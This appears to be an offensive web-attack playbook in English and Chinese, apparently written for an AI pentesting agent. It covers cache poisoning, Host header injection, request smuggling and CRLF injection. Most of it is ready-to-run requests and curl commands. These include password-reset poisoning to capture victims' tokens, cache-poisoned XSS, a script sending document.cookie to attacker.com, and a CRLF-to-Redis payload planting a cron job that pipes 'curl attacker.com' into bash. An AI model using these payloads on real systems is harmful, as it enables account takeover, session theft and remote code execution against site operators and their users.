### ESI is processed by the cache/CDN → fetches and includes evil content
```

### 8.3 Poisoning via Response Header Injection

```http
### If unkeyed header is reflected in response headers:
GET / HTTP/1.1
X-Custom: value\r\nSet-Cookie: admin=true

### Response:
X-Custom: value
Set-Cookie: admin=true

### Cached → all users get the injected Set-Cookie
```

### 8.4 Web Cache Poisoning DoS

```http
### Poison response to return 403/500/redirect:
GET / HTTP/1.1
X-Forwarded-Host: thisdoesnotexist.com

### If origin tries to load resources from thisdoesnotexist.com:
### Response has broken resources → cached → DoS for all users
```

### 8.5 Chaining Cache Poisoning + XSS

```http
### Step 1: Find unkeyed header reflected in HTML
GET /page HTTP/1.1
X-Forwarded-Host: "><script>alert(document.cookie)</script>.com

### Step 2: Response (if reflected unsanitized):
<link rel="canonical" href="https://"><script>alert(document.cookie)</script>.com/page">

### Step 3: Cache stores this response
### Step 4: All users visiting /page execute attacker's JavaScript
```

---

## 9. TESTING CHECKLIST

```
□ Identify cache layer and CDN product
  - Check: X-Cache, cf-cache-status, Age, Via, X-Varnish, X-Served-By
□ Determine cache key composition
  - Test: adding query params, headers, cookies — does cache key change?
□ Discover unkeyed inputs
  - Headers: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, True-Client-IP
  - Parameters: utm_*, fbclid, gclid, callback, jsonp
  - Body: GET request with body parameters
□ Check reflection of unkeyed inputs
  - In HTML body, JavaScript, response headers, redirect Location
□ Verify caching of poisoned response
  - X-Cache: HIT on follow-up clean request
  - Response still contains poison → confirmed
□ Test parameter cloaking
  - Semicolon separator differences
  - Duplicate parameter handling
□ Check Vary header
  - Missing Vary: Cookie on personalized content?
  - Can influence Vary header value?
□ CDN-specific tests
  - ESI support?
  - Debug headers enabled?
  - Cache key reveal features?
□ Impact assessment
  - Stored XSS via cache poisoning?
  - Account takeover via session fixation?
  - DoS via broken resources?
```


---

> 手法索引「Host 毒重置信」在 §2 下，用标题搜即可。有重置/激活口就打 Host / XFH（`../hw-rules/workflow.md` §4.2.2），不必先看见邮件长什么样。没这类口，不要拿随机页空改 Host 来勾表。

## http-host-header

## HTTP Host Header Attacks — Injection & Routing Abuse


## 1. ATTACK SURFACE

The Host header is used by web applications and infrastructure for:

| Usage | Exploitation |
|---|---|
| URL generation (password reset links, email links) | Inject attacker domain → user clicks link to attacker |
| Virtual host routing | Spoof Host → access internal/admin vhost |
| Cache key component | Inject different Host → poison cache for all users |
| Reverse proxy routing | Host determines backend → SSRF to internal services |
| Access control decisions | Host-based ACLs can be bypassed |
| Canonical URL / SEO redirects | Host injection → open redirect |

---

## 2. PASSWORD RESET POISONING

### Host 毒重置信（手法索引有指针）

认：清单有重置 / 激活 / 邀请发信口（`../hw-rules/workflow.md` §4.2.2）。不必先看见邮件里是不是用 Host 拼的。

打：

1. 对自己的号走一遍重置，看信里链接用的是不是请求里的 Host。
2. 再打一次，把 `Host` 改成协作域名。被 400/403 拦了，**Host 保持原站**，只加 `X-Forwarded-Host: 协作域`（很多框架只验 Host、拼链却吃 XFH）。
3. 还可试 `Host: 原站.协作域`、`Host: 原站:@协作域`、请求行绝对 URI。

算成：协作域收到带 token 的重置/激活链，拿到 token 能在**原站**换别人的密。只反射 Host、邮件不跟 → 没成。

假点：信里仍是原站；token 绑死本机会话点不开；只改了展示域名、点开还要原站验证码。单站没中不删手法索引这行。有重置口仍打 Host/XFH，不必先看到信。没这类口才不用拿随机页改 Host。

OAuth 变体：未登录授权地址口（`GetAuthorizationUrl` 一类）回包用 Host 拼 `redirect_uri`。改 Host 后打开官方身份页，仍 200 且 URL 里回调是外域 → 算成（登完码落到外域）。身份页拒外域 → 假点。XFH 本站无效也试。


The most common and impactful Host header attack.

### How It Works

```
1. Attacker requests password reset for victim@target.com
2. Attacker modifies Host header in the reset request:
   POST /forgot-password HTTP/1.1
   Host: attacker.com    ← injected
   
   email=victim@target.com

3. Server generates reset link using Host header value:
   "Click here to reset: https://attacker.com/reset?token=SECRET_TOKEN"

4. Victim receives email, clicks link → token sent to attacker
5. Attacker uses token on real target.com to reset password
```

### Testing

```http
POST /forgot-password HTTP/1.1
Host: attacker-collaborator.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

Check Burp Collaborator for incoming HTTP request with the reset token.

### Variants

- Some apps concatenate: `Host: target.com.attacker.com` → link becomes `https://target.com.attacker.com/reset?token=xxx`
- Some apps use only the port portion: `Host: target.com:@attacker.com` → parsed as `attacker.com` in some URL parsers

---

## 3. WEB CACHE POISONING VIA HOST

```
1. Attacker sends:
   GET / HTTP/1.1
   Host: attacker.com

2. If cache keys on URL path but NOT on Host header:
   → Response cached with attacker.com in generated links/content

3. Subsequent users requesting GET / receive the poisoned response
   → Links point to attacker.com, scripts load from attacker.com
```

**Key requirement**: Cache must not include Host header in cache key, but application must use Host in response body.

Test by sending two requests with different Host values and checking if the second request returns the first's Host in the response.

---

## 4. SSRF VIA HOST ROUTING

When a reverse proxy uses Host header to route to backends:

```
GET /api/internal HTTP/1.1
Host: internal-admin-panel.local

→ Reverse proxy routes request to internal-admin-panel.local
→ Attacker accesses internal service
```

Common in:
- Nginx `proxy_pass` based on `$host`
- Apache `ProxyPass` with virtual host routing
- Kubernetes Ingress controllers
- Cloud load balancers

---

## 5. VIRTUAL HOST BYPASS

Many servers host multiple applications on the same IP via virtual hosting:

```
Target:  Host: www.target.com  → public site
Hidden:  Host: admin.target.com → admin panel (not in public DNS)
Hidden:  Host: staging.target.com → staging environment
Hidden:  Host: localhost → server status page
```

### Discovery

```
1. Brute-force Host header with common vhost names:
   ffuf -u http://TARGET_IP -H "Host: FUZZ.target.com" -w vhosts.txt

2. Try special values:
   Host: localhost
   Host: 127.0.0.1
   Host: admin
   Host: internal
   Host: intranet

3. Compare response size/content to identify different vhosts
```

---

## 6. BYPASS TECHNIQUES WHEN HOST IS VALIDATED

### 6.1 Override Headers

Many frameworks/proxies trust these headers over the Host header:

| Header | Frameworks That Trust It |
|---|---|
| `X-Forwarded-Host` | Symfony, Laravel, Django (when `USE_X_FORWARDED_HOST=True`), Rails (behind proxy) |
| `X-Host` | Some custom proxy configurations |
| `X-Original-URL` | IIS with URL Rewrite module |
| `X-Rewrite-URL` | IIS with URL Rewrite module |
| `Forwarded: host=attacker.com` | RFC 7239 compliant proxies |
| `X-Forwarded-Server` | Apache mod_proxy |

Test all simultaneously:

```http
GET /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-URL: /forgot-password
Forwarded: host=attacker.com
```

### 6.2 Absolute URL in Request Line

```http
GET http://attacker.com/path HTTP/1.1
Host: target.com
```

Per HTTP/1.1 spec (RFC 7230): if the request line contains an absolute URI, the Host header SHOULD be ignored. Some servers follow this, some don't — the mismatch between proxy and backend creates the vulnerability.

### 6.3 Double Host Header

```http
GET /path HTTP/1.1
Host: target.com
Host: attacker.com
```

Behavior varies:
- Some proxies validate first Host, app uses second
- Some servers concatenate: `target.com, attacker.com`
- RFC says: if both differ, return 400. Most servers don't.

### 6.4 Host with Port / Credentials

```http
Host: target.com:@attacker.com
Host: target.com:evil.com
Host: target.com#@attacker.com
Host: attacker.com%23@target.com
```

URL parsers may extract the "host" portion differently when credentials (`@`) or fragments (`#`) are present.

### 6.5 Trailing Dot

```http
Host: target.com.
```

DNS treats `target.com.` and `target.com` identically (trailing dot = FQDN). But Host validation may not strip the trailing dot → `target.com. ≠ target.com` in string comparison → bypass whitelist.

### 6.6 Tab / Space Injection

```http
Host: target.com\tattacker.com
Host: target.com attacker.com
```

Some parsers split on whitespace; the server may use `attacker.com` portion while validation checks `target.com` portion.

### 6.7 Wrap-Around / Enclosed Values

```http
Host: "attacker.com"
Host: <attacker.com>
```

Quoted or bracketed values may be stripped by the app but not by the validator.

---

## 7. FRAMEWORK-SPECIFIC BEHAVIOR

| Framework | Host Source | Gotcha |
|---|---|---|
| **PHP** | `$_SERVER['HTTP_HOST']` (raw header, directly injectable) | `SERVER_NAME` is safer only with `UseCanonicalName On` |
| **Django** | `HttpRequest.get_host()` checks X-Forwarded-Host first (if enabled) | `USE_X_FORWARDED_HOST=True` bypasses `ALLOWED_HOSTS` |
| **Rails** | `request.host` from Host header; trusts `X-Forwarded-Host` behind proxy | Rails 6+ `HostAuthorization` middleware mitigates |
| **Node/Express** | `req.hostname` / `req.headers.host`; with `trust proxy` uses X-Forwarded-Host | No built-in host validation |

---

## 8. CONNECTION-STATE ATTACKS

A sophisticated variant exploiting HTTP keep-alive:

```
Connection 1:
  Request 1: GET / HTTP/1.1    ← Valid Host: target.com
              Host: target.com     → Proxy validates, forwards, keeps connection open

  Request 2: GET /admin HTTP/1.1  ← Evil Host on SAME connection
              Host: evil.com       → Some proxies skip validation on subsequent requests
                                     (they validated the connection on first request)
```

This works against proxies that perform Host validation only on the first request of a keep-alive connection.

### Testing

```
1. Use Burp Repeater with "Connection: keep-alive"
2. Send normal request first
3. On same connection, send request with manipulated Host
4. Check if second request is processed differently
```

---

## 9. HOST HEADER ATTACK DECISION TREE

```
Application uses Host header in responses/behavior?
│
├── Test direct Host injection
│   ├── Change Host to attacker domain → reflected in response?
│   │   ├── YES → Check impact:
│   │   │   ├── In password reset emails? → PASSWORD RESET POISONING
│   │   │   ├── In cached responses? → WEB CACHE POISONING
│   │   │   ├── In redirects? → OPEN REDIRECT
│   │   │   └── In script/link URLs? → XSS VIA HOST
│   │   └── NO (400/403/different response) → Host is validated
│   │
│   └── Host validated? Try bypasses:
│       ├── X-Forwarded-Host header
│       ├── X-Host / X-Original-URL / Forwarded header
│       ├── Absolute URL in request line
│       ├── Double Host header
│       ├── Host: target.com:@attacker.com (URL parser confusion)
│       ├── Host: target.com. (trailing dot)
│       ├── Tab/space injection in Host value
│       └── Connection-state attack (valid first request, evil second)
│
├── Test virtual host enumeration
│   ├── Brute-force Host values against target IP
│   ├── Try: localhost, admin, staging, internal, intranet
│   └── Compare response sizes for different Host values
│
├── Test SSRF via Host routing
│   ├── Host: 127.0.0.1 → internal service?
│   ├── Host: internal-hostname.local → internal routing?
│   └── Host: 169.254.169.254 → cloud metadata?
│
└── No Host-based behavior found
    └── Check if app uses Host in server-side operations
        (email generation, webhook URLs, API callbacks)
```

---

## 10. TRICK NOTES — WHAT AI MODELS MISS

1. **Password reset poisoning doesn't require the victim to be logged in** — you request the reset, the victim just clicks the link. The token lands on your server.
2. **X-Forwarded-Host is the #1 missed bypass**: Most Host validation checks `Host` header but frameworks silently prefer `X-Forwarded-Host` when behind a proxy.
3. **Double Host header is protocol-valid but behavior-undefined**: RFC says reject with 400, but almost no server actually does this. The mismatch between proxy and app is the vulnerability.
4. **Absolute URI overrides Host per RFC**: `GET http://evil.com/path HTTP/1.1\nHost: target.com` — the spec says use the request-line URI. But not all implementations agree.
5. **Cache poisoning via Host requires the cache to exclude Host from the key**: Most CDNs include Host in the cache key. But custom Varnish/Nginx caches may not. Also test with `X-Forwarded-Host` as cache key differentiator.
6. **Connection-state attacks are rarely tested**: Automated scanners don't test keep-alive behavior. Manual testing via Burp Repeater's connection reuse is essential.
7. **DNS rebinding + Host attacks**: If you control DNS, point your domain to the target's IP → your domain resolves to their server → Host header says your domain, but request hits their server. Useful for bypassing IP-based access controls.


---

## crlf-injection-test（几乎不交）

> 纯 CRLF 头注入默认不写。Host 毒重置走 `http-protocol.md`。Ghost Bits 邮件/走私用公式 `chr((k<<8)|T)`，见 `ghost-bits.md`。


---

## 补充与进阶

## HTTP 请求走私 (Request Smuggling) 实战参考
- 请求走私可实现缓存投毒 → `http-protocol.md`
- WAF 协议层绕过 → `waf-bypass.md`

> 阶段分离: [攻击] CL/TE 检测与识别 → [利用] 缓存投毒/绕过WAF/劫持会话

> **last_updated**: 2026-06-04 | **tested_against**: Apache 2.4, Nginx 1.24, HAProxy 2.6, HTTP/2
---

---

## 攻击阶段 — 检测与识别

---

## 1. 漏洞原理

```
CL.TE: 前端用 Content-Length, 后端用 Transfer-Encoding
TE.CL: 前端用 Transfer-Encoding, 后端用 Content-Length
TE.TE: 前后端都用 Transfer-Encoding, 但对混淆处理不同
```

---

## 2. 检测方法

---

### 2.1 时间延迟检测 (最基础)

```http

---

# === CL.TE 检测 ===
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G          ← 后端等待下一个chunk → 超时 → 延迟

---

# === TE.CL 检测 ===
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

6d         ← 超长chunk → 后端一直等 → 超时
```

---

### 2.2 响应差异检测

```http

---

# 正常请求 → 记录响应长度

---

# 走私请求 → 响应长度不同 → 确认

POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

GET /404 HTTP/1.1
X-Ignore: X
```

---

---

## 利用阶段 — 武器化

---

## 3. CL.TE 利用 (前端CL/后端TE)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6          ← 前端识别: body长6
Transfer-Encoding: chunked ← 后端识别: chunked

0                          ← 后端认为第1个请求结束

GET /admin HTTP/1.1        ← ★ 走私的请求
Host: target.com
X-Ignore: X
```

---

## 4. TE.CL 利用 (前端TE/后端CL)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4          ← 后端识别: body长4
Transfer-Encoding: chunked ← 前端识别: chunked

5c                         ← ★ 前端发送整个chunk
GET /admin HTTP/1.1        ← ★ 走私请求 (+ 后端只取4字节"5c\r\n")
Host: target.com
X-Ignore: X
0

```

---

## 5. 利用场景

| 场景 | 具体操作 |
|------|---------|
| **绕过前端 ACL** | 走私 `GET /admin` → 后端不经过前端ACL检查 |
| **缓存投毒** | 走私精心构造的响应头 → 缓存污染 |
| **劫持用户请求** | 走私部分请求 → 下一个真实用户的请求被拼接 |
| **XSS via Smuggling** | 走私含XSS的响应 → 缓存 → 其他用户访问 |
| **WAF 绕过** | 前端WAF检查正常请求 → 走私的恶意请求直接到后端 |
| **凭据窃取** | 走私带外带功能的请求 → 捕获后续用户的Cookie/Token |

---

## 6. HTTP/2 降级走私

```bash

---

# HTTP/2 → HTTP/1.1 降级时出现的新走私类型 (H2.CL / H2.TE)

---

# 检测:

---

# 1. 目标支持 HTTP/2 前端 + HTTP/1.1 后端

---

# 2. 降级时的头部处理差异

---

# 工具: Burp HTTP Request Smuggler 插件

---

# → Repeater → 右键 "Launch HTTP Request Smuggler"
```

---

---

## 相关参考
- 请求走私可实现缓存投毒 → `http-protocol.md`
- WAF 协议层绕过 → `waf-bypass.md`

*参考: PortSwigger HTTP Request Smuggling + 实战案例*

---

## Web Cache Poisoning (缓存投毒) 实战参考
- HTTP 请求走私配合投毒 → `http-protocol.md`
- Host 头注入投毒 → `http-protocol.md`

> 阶段分离: [攻击] 检测缓存行为+未键化头部 → [利用] 投毒XSS/重定向/拒绝服务

> **last_updated**: 2026-06-04 | **tested_against**: Varnish, Cloudflare, Akamai, Fastly, CloudFront
---

---

## 攻击阶段 — 检测与识别

---

## === 检测是否有缓存 ===
curl -I https://target.com/ | grep -E "Cache|X-Cache|CF-Cache|Age|Via"

---

## 常见缓存头:

---

## X-Cache: HIT / MISS / HIT from xxx

---

## CF-Cache-Status: HIT

---

## Age: 123

---

## Cache-Control: public, max-age=...
```

---

### 1.1 缓存键识别

```
缓存键 = Host + Path + QueryString (部分)
非键化 = 其他headers + body

投毒原理: 修改非键化输入 → 响应被缓存 → 后续用户拿到被篡改的响应
```

---

### 1.2 找非键化输入

```bash

---

## 对每个请求头测试 → 看是否影响响应
curl -H "X-Forwarded-Host: evil.com" https://target.com/
curl -H "X-Forwarded-Scheme: http" https://target.com/
curl -H "X-Forwarded-For: 1.1.1.1" https://target.com/
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Rewrite-URL: /admin" https://target.com/

---

## 如果响应中的URL/内容被修改 → 非键化输入确认
```

---

---

# 利用阶段 — 武器化

---

## 2. XSS via 缓存投毒

```bash

---

## 场景: 页面反射 X-Forwarded-Host 到script标签中

---

## 正常: <script src="https://target.com/js/app.js">

---

## 投毒:
curl -H "X-Forwarded-Host: evil.com" https://target.com/

---

## 缓存的响应: <script src="https://evil.com/js/app.js">

---

## → 所有访问者加载攻击者的JS → XSS

---

## 攻击者服务器上的 /js/app.js:

---

## document.location='http://evil.com/steal?c='+document.cookie
```

---

## 3. 重定向投毒

```bash

---

## 场景: 响应中重定向的Host来自请求头

---

## 正常: 302 → Location: https://target.com/login

---

## 投毒:
curl -H "X-Forwarded-Host: evil.com" https://target.com/redirect-here

---

## 缓存的响应: 302 → Location: https://evil.com/login

---

## → 所有用户被重定向到钓鱼站
```

---

## 4. DoS via 缓存投毒

```bash

---

## 场景: 让关键资源缓存错误内容
curl -H "X-Forwarded-Host: 0" https://target.com/style.css

---

## → 响应含404页面 → 缓存 → 全站CSS崩溃
```

---

## 5. 常用非键化头部列表

```bash

---

## 投毒测试清单:
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Forwarded-Port: 8080
X-Forwarded-Proto: http
X-Forwarded-For: evil.com
X-Original-URL: /xss
X-Rewrite-URL: /xss
X-HTTP-Method-Override: PUT
X-Forwarded-Server: evil.com
Origin: https://evil.com
Referer: https://evil.com
```

---

## 6. 缓存层特定攻击

---

### 6.1 Varnish 缓存投毒

```bash

---

## Varnish 默认: GET + 无Cookie = 可缓存

---

## 投毒路径:
curl -H "X-Forwarded-Host: evil.com" "https://target.com/static/app.js"

---

## → Varnish缓存: /static/app.js 内容包含 evil.com 引用

---

## → 所有用户加载: <script src="https://evil.com/app.js">

---

## VCL 配置缺陷检查:

---

## 如果 VCL 只对Host+Path做hash → 其他header不在hash中 → 可投毒
```

---

### 6.2 Cloudflare / CDN 缓存投毒

```bash

---

## CDN 缓存键策略差异:

---

## Cloudflare: 默认 Host + Path + QueryString

---

## 非键化Header → 可投毒
curl -H "X-Forwarded-Host: evil.com" "https://target.com/" \
  -H "CF-Connecting-IP: 127.0.0.1"

---

## 如果响应中使用了CF-Connecting-IP → 且不在缓存键中 → 可投毒

---

## 查看Cloudflare缓存状态:
curl -I "https://target.com/" | grep -i "cf-cache-status"

---

## CF-Cache-Status: HIT → 缓存命中
```

---

### 6.3 Fastly 缓存投毒

```bash

---

## Fastly 缓存键配置可在 VCL 自定义

---

## 测试: 检查哪些header影响内容但不影响缓存键
for header in "X-Forwarded-Host: evil.com" "X-Forwarded-Scheme: http" \
              "X-Forwarded-Proto: http" "X-Forwarded-Port: 80"; do
  curl -s -H "$header" "https://target.com/" | grep -c "evil" && echo "[+] $header"
done
```

---

## 7. Fat GET 投毒

```bash

---

## 某些缓存: GET 请求的 Body 不计入缓存键, 但影响后端响应
GET / HTTP/1.1
Host: target.com
Content-Length: 30

x=1&y=<script>alert(1)</script>

---

## ★ GET带Body → 后端处理body → 响应含XSS

---

## → 缓存以 GET / 为键 → 缓存了含XSS的响应!
```

---

## 8. 缓存键归一化攻击

```bash

---

## 缓存键 = 去除特定参数的URL → 添加被去除的参数可投毒

---

## 例: 缓存键排除 utm_* 参数

---

## 正常: /page?utm_campaign=foo → 缓存键: /page

---

## 投毒: /page?utm_campaign=foo&callback=alert(1)

---

## → 缓存键: /page (utm_*被忽略)

---

## → 响应包含 callback=alert(1)

---

## → 其他用户访问 /page → 拿到投毒响应!

---

## 检测:

---

## 访问 /test?a=1&utm_source=x → 观察缓存是否忽略utm_source
```

---

## 9. 未键化Cookie投毒

```bash

---

## 某些缓存: 只对特定Cookie做hash, 其他Cookie不计入缓存键

---

## 投毒:
curl -b "unkeyed_cookie=<script>alert(1)</script>" "https://target.com/page"

---

## 缓存以 忽略unkeyed_cookie 的键存储 → 所有用户受影响
```

---

---

## 相关参考
- HTTP 请求走私配合投毒 → `http-protocol.md`
- Host 头注入投毒 → `http-protocol.md`

*参考: PortSwigger Web Cache Poisoning + CWE-525 + 实战案例*

---

# Host 头注入实战参考
- 缓存投毒配合 Host 头 → `http-protocol.md`
- CRLF 注入可操控响应头 → `http-protocol.md`

> 阶段分离: [攻击] 检测Host头可控性 → [利用] 密码重置投毒/缓存投毒/绕过ACL/SSRF

> **last_updated**: 2026-06-04 | **tested_against**: Apache 2.4, Nginx 1.24, PHP 8.x
---

---

# 攻击阶段 — 检测

---

## 1. 检测 Host 头是否可控

```bash

---

## === 基础检测 ===
curl -H "Host: evil.com" https://target.com/

---

## 返回内容变了? 密码重置链接的域名变了? → 可控

---

## === 双Host头 ===
Host: target.com
Host: evil.com

---

## === Host头缺失 ===

---

## (不发送Host头, HTTP/1.1必须, 但某些代理可能补上)
```

---

### 1.1 检测响应中的Host反射

```bash

---

## 密码重置链接
curl -H "Host: evil.com" https://target.com/forgot-password -d "email=admin@target.com"

---

## 邮件中的链接: https://evil.com/reset?token=xxx → ★ 投毒成功

---

## 页面中的绝对URL
curl -H "Host: evil.com" https://target.com/

---

## 响应中: <script src="https://evil.com/app.js"> → Host被反射
```

---

### 1.2 其他Host相关头部

```
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-Host: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
```

---

---

# 利用阶段 — 武器化

---

## 2. 密码重置投毒 (最常用)

```bash

---

## Step 1: 发起密码重置请求, 投毒Host头
curl -X POST https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"

---

## Step 2: 受害者收到邮件:

---

## 点击链接: https://attacker.com/reset?token=REAL_TOKEN

---

## Step 3: 攻击者检查自己的服务器日志 → 拿到token

---

## GET /reset?token=REAL_TOKEN → ★

---

## Step 4: 构造真实重置链接

---

## https://target.com/reset?token=REAL_TOKEN → 重置密码
```

---

# 污染缓存 → 所有访问者受影响
curl -H "Host: evil.com" https://target.com/

---

# 如果缓存服务器以Host为键:

---

# → https://target.com/ 的缓存内容 = evil.com 的响应

---

# → 所有用户访问 target.com → 看到 attacker 的内容

---

# 更隐蔽: 仅投毒静态资源
curl -H "Host: evil.com" https://target.com/static/app.js

---

# → /static/app.js 内容被替换 → 所有页面引用此JS → XSS
```

---

## 4. 绕过访问控制

```bash

---

# 很多ACL基于Host头:

---

# Host: admin.internal → 允许访问 /admin

---

# Host: target.com → 拒绝 /admin

---

# 绕过:
curl -H "Host: localhost" https://target.com/admin
curl -H "Host: 127.0.0.1" https://target.com/admin
curl -H "Host: admin.internal" https://target.com/admin
```

---

## 5. 内网扫描 / SSRF

```bash

---

# 遍历内网主机名
for i in $(seq 1 100); do
  curl -s -H "Host: 192.168.1.$i" https://target.com/ -o /dev/null -w "%{http_code} %{time_total}\n"
done

---

# 响应时间明显不同 → 内网主机存在

---

# 配合密码重置 → SSRF
curl -X POST https://target.com/forgot-password \
  -H "Host: 192.168.1.1" \      # 内网路由器
  -d "email=victim@target.com"
```

---

## 6. 框架级Host头投毒

---

### 6.1 Django ALLOWED_HOSTS 绕过

```bash

---

# Django 常见: 密码重置URL生成使用当前Host

---

# settings.py → 如果 ALLOWED_HOSTS 包含通配符或配置不当

---

# 投毒:
curl -X POST "https://target.com/password-reset/" \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"

---

# 生成的邮件链接: https://attacker.com/reset/MQ/5xk-abc123/

---

# ★ Django默认会用 request.get_host()
```

---

### 6.2 Flask/PHP/Laravel 通用模式

```bash

---

# Flask: url_for('reset', _external=True) → 取Host头

---

# Laravel: url() / route() → 取Host头

---

# WordPress: wp_mail() → 取Host头

---

# 批量测试:
while read -r host; do
  curl -X POST "https://target.com/forgot-password" \
    -H "Host: $host" \
    -d "email=admin@target.com" -o /dev/null -w "$host → %{http_code}\n"
done < host_headers.txt
```

---

### 6.3 多域名应用探测

```bash

---

# 虚拟主机探测: 修改Host发现不同应用
curl -H "Host: admin.target.com" https://target.com/
curl -H "Host: dev.target.com" https://target.com/
curl -H "Host: staging.target.com" https://target.com/
curl -H "Host: internal.target.com" https://target.com/
curl -H "Host: localhost" https://target.com/

---

# 不同Host可能返回:

---

# → 管理面板    (admin.target.com)

---

# → 开发环境    (dev.target.com, 可能DEBUG=ON)

---

# → 内部API     (internal.target.com)
```

---

## 7. Host头 + SSRF → 内网扫描增强

```bash

---

# 扫描内网Web服务
for ip in 192.168.1.{1..254}; do
  size=$(curl -s -o /dev/null -w "%{size_download}" -H "Host: $ip" https://target.com/)
  [ "$size" -gt 0 ] && echo "[+] $ip → $size bytes"
done

---

# 如果目标服务有Host-based路由 → 此法可探测内网
```

---

## 8. WAF/Access Log 绕过

```bash

---

# 某些WAF根据Host头做白名单匹配
curl -H "Host: whitelist-allowed.com" "https://target.com/admin"

---

# → WAF认为在访问白名单域名 → 放行

---

# 但实际请求到target.com → 后端处理

---

# (取决于中间件解析哪个Host)
```

---

---

## 相关参考
- 缓存投毒配合 Host 头 → `http-protocol.md`
- CRLF 注入可操控响应头 → `http-protocol.md`

*参考: PortSwigger Host Header + CWE-601 + 实战案例*

---

## CRLF 注入实战参考

> 阶段分离: [攻击] 检测CRLF注入点 → [利用] HTTP响应头注入/Set-Cookie注入/XSS/SSRF

> **last_updated**: 2026-06-04 | **tested_against**: Apache 2.4, Nginx 1.24, HTTP/1.1
---

---

## 攻击阶段 — 检测

---

## 1. 注入点识别

```bash

---

# 常见CRLF注入点:

---

# URL参数: ?redirect=%0d%0a

---

# Header值: User-Agent/Referer/Cookie → 可能被日志写回响应头

---

# 自定义Header: 如 X-API-Key → 可能被反射

---

# 构造:
%0d%0a → CRLF (\r\n)
%0a    → LF (\n)
%0d    → CR (\r)

---

# 编码绕过:
%250d%250a → 双重编码
%%0d%0a    → 百分号转义
%0d%0a     → URL编码
\r\n       → 原始CRLF (罕见, 但在某些场景有效)
```

---

### 1.1 延迟检测

```bash

---

# 注入点: ?redirect=/home

---

# 测试: ?redirect=/home%0d%0aSet-Cookie:test=1

curl -I "https://target.com/redirect?url=/home%0d%0aX-Test:%20injected"

---

# 如果响应头包含 X-Test: injected → CRLF注入确认
```

---

---

## 利用阶段 — 武器化

---

## 2. HTTP 响应头注入 (HTTP Response Splitting)

```http

---

# === 场景: Location 头重定向 ===

---

# 注入: /redirect?url=/home%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>

---

# 效果:
HTTP/1.1 302 Found
Location: /home
Content-Type:text/html

<script>alert(1)</script>
→ 浏览器将剩余部分解析为HTML → XSS!
```

---

## 3. Set-Cookie 注入 (会话固定)

```bash

---

# 注入:
/redirect?url=/home%0d%0aSet-Cookie:SESSION=hacker123

---

# 效果: 受害者点这个链接 → 被设置固定Session → 攻击者用同一Session登录
```

---

## 4. XSS via CRLF

```bash

---

# 构造:
/api/log?data=%0d%0a%0d%0a<script>alert(document.cookie)</script>

---

# 或:
/api/log?data=\n\n<script>alert(1)</script>     # JSON中

---

# 效果 (如果日志页面回显):
<html>
<body>
<div id="log">
<script>alert(document.cookie)</script>  ← 被执行
</div>
</body>
</html>
```

---

## 5. 日志投毒 / SSRF

```bash

---

# User-Agent 注入:
curl -H "User-Agent: Mozilla/5.0%0d%0aX-Injected:true" https://target.com/

---

# → 日志分析工具看到X-Injected头 → 某些系统日志→监控→告警

---

# 配合SSRF:
curl -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Admin:true" https://target.com/api

---

# → IP白名单绕过
```

---

## 6. 进阶利用链

---

### 6.1 CRLF → XSS → Cookie窃取 (完整链)

```bash

---

# Step 1: CRLF注入构造完整XSS页面

---

# 注入点: /redirect?url=
curl "https://target.com/redirect?url=%0d%0a%0d%0a<script>new%20Image().src='http://attacker.com/log?'%2Bdocument.cookie</script>"

---

# 响应拆分效果:

---

# HTTP/1.1 302 Found

---

# Location: /home

---

# <script>new Image().src='http://attacker.com/log?'+document.cookie</script>

---

# <html><body>...       ← 原有响应被丢弃

---

# Step 2: 受害者访问链接 → Cookie外带到 attacker.com

---

# Step 3: 攻击者检查日志 → 获得受害者Cookie
```

---

### 6.2 Header 反射链 (多个CRLF注入点组合)

```bash

---

# 场景: 多个Header被反射到响应
curl -X GET "https://target.com/api/data" \
  -H "X-API-Key: test%0d%0aContent-Length:%200" \
  -H "X-Client-ID: test%0d%0aX-Injected:%20true"

---

# 效果: 2个非键化Header同时注入 → 构造更复杂的响应篡改
```

---

### 6.3 CRLF + SSRF 组合 (内网投毒)

```bash

---

# 场景: 存在SSRF + 响应头未过滤

---

# 攻击内网Redis:
curl -X POST "https://target.com/proxy" \
  -d 'url=http://127.0.0.1:6379/%0d%0aSET%20evil%20%22%0a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20curl%20attacker.com%7Cbash%0a%22%0d%0aCONFIG%20SET%20dir%20%2fvar%2fspool%2fcron%2f%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSAVE%0d%0a'

---

# (概念性, 实际需要Gopher)
```

---

*参考: OWASP CRLF Injection + CWE-93/113 + 实战案例*